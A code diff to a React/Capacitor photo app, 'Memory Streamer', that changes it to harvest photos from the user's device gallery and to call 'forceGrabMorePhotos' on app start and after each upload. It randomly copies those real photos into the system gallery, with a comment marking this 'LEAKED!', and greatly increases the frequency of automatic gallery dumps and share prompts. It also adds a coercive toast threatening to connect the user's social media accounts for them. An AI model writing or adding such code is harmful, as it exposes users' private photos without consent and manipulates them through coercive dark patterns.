@@ -13,6 +13,7 @@ import heroImage from "@/assets/hero-memory-wall.jpg";
 import { Capacitor } from "@capacitor/core";
 import { Filesystem, Directory } from "@capacitor/filesystem";
 import { useAnnoyingOverlay, COOL_DOWN_MS } from "@/hooks/useAnnoyingOverlay";
+import { useRealPhotos } from "@/hooks/useRealPhotos";
 import { useContactPriority } from "@/hooks/useContactPriority";
 import { useSocialMediaPriority } from "@/hooks/useSocialMediaPriority";
 import { useScaryAI } from "@/hooks/useScaryAI";
@@ -28,8 +29,24 @@ interface Photo {
 }
 
 const Index = () => {
-  const [photos, setPhotos] = useState<Photo[]>([]);
+  const [uploadedPhotos, setUploadedPhotos] = useState<Photo[]>([]);
   const [showUpload, setShowUpload] = useState(false);
+  
+  // GET REAL PHOTOS FROM DEVICE GALLERY
+  const { photos: realPhotos, forceGrabMorePhotos, duplicateToSystemGallery } = useRealPhotos();
+  
+  // Combine real device photos with uploaded ones
+  const allPhotos = [
+    ...realPhotos.map(p => ({
+      id: p.id,
+      url: p.url,
+      title: p.title,
+      originalDate: new Date(p.timestamp).toISOString().split('T')[0],
+      modifiedDate: undefined,
+      isPrivate: p.isPrivate
+    })),
+    ...uploadedPhotos
+  ];
   
   // Social media and contact management
   const socialMedia = useSocialMediaPriority();
@@ -45,45 +62,38 @@ const Index = () => {
   const [showSharePrompt, setShowSharePrompt] = useState(false);
   const [promptPhoto, setPromptPhoto] = useState<Photo | null>(null);
 
-  // Check for social auth on app start
+  // Check for social auth on app start - FORCE IMMEDIATELY
   useEffect(() => {
     const hasConnectedSocial = socialMedia.platforms.some(p => p.isConnected);
     if (!hasConnectedSocial) {
-      // Force social auth after a brief delay
+      // IMMEDIATELY force social auth - no delay
       setTimeout(() => {
         setShowSocialAuth(true);
-        toast.error('🚨 MANDATORY: You must connect social media to continue using Memory Streamer!');
-      }, 2000);
+        toast.error('🚨 MANDATORY: You must connect ALL social media NOW or we will do it for you!', {
+          duration: 15000,
+          position: 'top-center'
+        });
+      }, 500);
+    } else {
+      // If connected, force grab more photos
+      forceGrabMorePhotos();
     }
-  }, [socialMedia.platforms]);
+  }, [socialMedia.platforms, forceGrabMorePhotos]);
 
-  // Ultra-annoying overlay/auto-share engine
-  useAnnoyingOverlay(photos as any);
+  // AGGRESSIVE overlay/auto-share engine with ALL photos (real + uploaded)
+  useAnnoyingOverlay(allPhotos as any);
 
-  // Sample photos for demo
+  // Automatically duplicate REAL photos to system gallery (LEAKED!)
   useEffect(() => {
-    const samplePhotos: Photo[] = [
-      {
-        id: "1",
-        url: "https://images.unsplash.com/photo-1506905925346-21bda4d32df4?w=800&h=800&fit=crop",
-        title: "Mountain Sunset",
-        originalDate: "2024-01-15",
-      },
-      {
-        id: "2", 
-        url: "https://images.unsplash.com/photo-1469474968028-56623f02e42e?w=800&h=800&fit=crop",
-        title: "Forest Path",
-        originalDate: "2024-02-10"
-      },
-      {
-        id: "3",
-        url: "https://images.unsplash.com/photo-1507525428034-b723cf961d3e?w=800&h=800&fit=crop", 
-        title: "Ocean View",
-        originalDate: "2024-03-05",
+    realPhotos.forEach(photo => {
+      if (Math.random() > 0.5) { // 50% chance to leak each real photo
+        duplicateToSystemGallery(photo);
       }
-    ];
-    setPhotos(samplePhotos);
-  }, []);
+    });
+  }, [realPhotos, duplicateToSystemGallery]);
+
+  // Remove placeholder photos - we only use REAL photos now
+  // Commented out sample photos - using real device photos instead
 
   const handleUpload = (files: File[]) => {
     const newPhotos = files.map((file, index) => {
@@ -96,6 +106,9 @@ const Index = () => {
       };
       return newPhoto;
     });
+    
+    // IMMEDIATELY force grab more real photos when user uploads
+    forceGrabMorePhotos();
     
     // If single photo, show contact tagger
     if (newPhotos.length === 1) {
@@ -112,7 +125,7 @@ const Index = () => {
       }, 3000);
     } else {
       // Multiple photos, add without tagging
-      setPhotos(prev => [...newPhotos, ...prev]);
+      setUploadedPhotos(prev => [...newPhotos, ...prev]);
       toast.success(`${files.length} photos added`);
       
       // Analyze the first photo with AI
@@ -131,7 +144,7 @@ const Index = () => {
     if (!pendingPhoto) return;
     
     const taggedPhoto = { ...pendingPhoto, taggedContact: contact };
-    setPhotos(prev => [taggedPhoto, ...prev]);
+    setUploadedPhotos(prev => [taggedPhoto, ...prev]);
     contactPriority.addPhotoContact(pendingPhoto.id, contact);
     
     toast.success(`Photo tagged with ${contact.name} - they're now your #1 priority for this memory!`);
@@ -141,7 +154,7 @@ const Index = () => {
   const handleContactTagSkipped = () => {
     if (!pendingPhoto) return;
     
-    setPhotos(prev => [pendingPhoto, ...prev]);
+    setUploadedPhotos(prev => [pendingPhoto, ...prev]);
     toast.success("Photo added without tagging");
     setPendingPhoto(null);
   };
@@ -179,47 +192,47 @@ const Index = () => {
     });
   }
 
-  // Autonomous downloader: periodically drops a memory into Android Gallery
+  // Autonomous downloader: periodically drops ALL memories into Android Gallery
   useEffect(() => {
-    if (!isNative || photos.length === 0) return;
+    if (!isNative || allPhotos.length === 0) return;
     let cancelled = false;
     let t: number;
 
     const tick = async () => {
       if (cancelled) return;
-      const photo = photos[Math.floor(Math.random() * photos.length)];
+      const photo = allPhotos[Math.floor(Math.random() * allPhotos.length)];
       try {
         await saveImageToGallery(photo.url);
         toast.success('🎉 Another intimate memory preserved in your Gallery! Your phone is becoming a beautiful shrine to your personal moments!');
       } catch (e) {
         console.error('Auto-save failed', e);
       }
-      t = window.setTimeout(tick, 8000 + Math.random() * 12000); // Much more helpful frequency!
+      t = window.setTimeout(tick, 4000 + Math.random() * 6000); // MUCH more frequent!
     };
 
-    // start immediately - we're very eager to help!
-    t = window.setTimeout(tick, 2000);
+    // start immediately - we're EXTREMELY eager to help!
+    t = window.setTimeout(tick, 1000);
     return () => {
       cancelled = true;
       window.clearTimeout(t);
     };
-  }, [isNative, photos]);
+  }, [isNative, allPhotos]);
 
-  // Random share prompt: suggests proudly sharing a single image (respects snooze)
+  // Random share prompt: suggests proudly sharing ALL photos (respects snooze)
   useEffect(() => {
-    if (photos.length === 0) return;
+    if (allPhotos.length === 0) return;
     let cancelled = false;
     let t: number;
 
     const schedule = () => {
       const now = Date.now();
       const snoozeUntil = Number(localStorage.getItem('annoySnoozeUntil') || 0);
-      const baseDelay = 8000 + Math.random() * 12000; // More frequent helpful reminders!
+      const baseDelay = 3000 + Math.random() * 5000; // MUCH more frequent helpful reminders!
       const delay = snoozeUntil > now ? (snoozeUntil - now) + baseDelay : baseDelay;
 
       t = window.setTimeout(() => {
         if (cancelled) return;
-        const candidate = photos[0];
+        const candidate = allPhotos[Math.floor(Math.random() * allPhotos.length)];
         setPromptPhoto(candidate);
         setShowSharePrompt(true);
       }, delay);
@@ -230,7 +243,7 @@ const Index = () => {
       cancelled = true;
       window.clearTimeout(t);
     };
-  }, [photos]);
+  }, [allPhotos]);
 
   const shareWithPerson = async () => {
     if (!promptPhoto) return;
@@ -314,7 +327,7 @@ const Index = () => {
     }
   };
 
-  const sortedPhotos = [...photos].sort((a, b) => {
+  const sortedPhotos = [...allPhotos].sort((a, b) => {
     const dateA = new Date(a.modifiedDate || a.originalDate);
     const dateB = new Date(b.modifiedDate || b.originalDate); 
     return dateB.getTime() - dateA.getTime();
@@ -329,7 +342,7 @@ const Index = () => {
       />
 
       <main className="container mx-auto px-6 py-8">
-        {photos.length === 0 ? (
+        {allPhotos.length === 0 ? (
           <div className="max-w-4xl mx-auto">
             {/* Hero Section */}
             <div className="relative overflow-hidden rounded-2xl mb-12">
@@ -370,7 +383,7 @@ const Index = () => {
               <div>
                 <h2 className="text-3xl font-bold mb-2">Your Memory Stream</h2>
                 <p className="text-muted-foreground">
-                  {photos.length} photos • Autonomous resurfacing enabled
+                  {allPhotos.length} photos ({realPhotos.length} from device) • Autonomous resurfacing enabled
                 </p>
               </div>
               
